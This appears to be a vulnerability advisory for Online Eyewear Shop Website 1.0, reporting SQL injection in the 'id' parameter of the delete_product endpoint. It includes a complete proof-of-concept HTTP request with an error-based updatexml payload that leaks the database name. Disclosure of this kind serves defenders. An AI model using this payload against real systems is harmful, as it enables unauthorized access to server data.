## Online Eyewear Shop Website has a front-end SQL injection vulnerability

## Affected version: 
Online Eyewear Shop Website - 1.0

## Software:
https://www.sourcecodester.com/php/16089/online-eyewear-shop-website-using-php-and-mysql-free-download.html

## Vulnerability File:
/oews/classes/Master.php?f=delete_product

## Description:
Online Eyewear Shop Website1.0 has a SQL injection attack in /oews/classes/Master.php?f=delete_product, and the attack parameter is id. Attackers can exploit this vulnerability to directly obtain sensitive information from the server.

Status: CRITICAL

POC
```
POST /oews/classes/Master.php?f=delete_product HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 5
Origin: http://localhost
Connection: close
Referer: http://localhost/oews/admin/?page=products
Cookie: PHPSESSID=af5dsp386jat1uspen8v4e8hhq
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

id=2%27%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q
```

Get the database name directly through the error report: oews_db

![CleanShot 2024-10-09 at 11 41 59@2x](https://github.com/user-attachments/assets/c6337151-4556-47f1-a3f0-b90b79305591)

## Code Analysis

![CleanShot 2024-10-09 at 11 43 44@2x](https://github.com/user-attachments/assets/9173c0c4-6f1f-432b-ab0d-a1324720f853)


